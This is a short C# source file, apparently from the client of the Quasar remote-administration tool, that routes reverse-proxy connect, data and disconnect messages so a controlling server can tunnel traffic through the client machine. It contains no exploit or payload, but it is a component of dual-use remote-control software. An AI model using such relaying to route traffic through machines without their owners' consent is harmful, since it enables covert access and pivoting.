using Quasar.Common.Messages;
using Quasar.Common.Messages.ReverseProxy;

namespace Quasar.Client.ReverseProxy
{
    public class ReverseProxyCommandHandler
    {
        public static void HandleCommand(Networking.Client client, IMessage packet)
        {
            var type = packet.GetType();

            if (type == typeof (ReverseProxyConnect))
            {
                client.ConnectReverseProxy((ReverseProxyConnect) packet);
            }
            else if (type == typeof (ReverseProxyData))
            {
                ReverseProxyData dataCommand = (ReverseProxyData)packet;
                ReverseProxyClient proxyClient = client.GetReverseProxyByConnectionId(dataCommand.ConnectionId);

                if (proxyClient != null)
                {
                    proxyClient.SendToTargetServer(dataCommand.Data);
                }
            }
            else if (type == typeof (ReverseProxyDisconnect))
            {
                ReverseProxyDisconnect disconnectCommand = (ReverseProxyDisconnect)packet;
                ReverseProxyClient socksClient = client.GetReverseProxyByConnectionId(disconnectCommand.ConnectionId);

                if (socksClient != null)
                {
                    socksClient.Disconnect();
                }
            }
        }
    }
}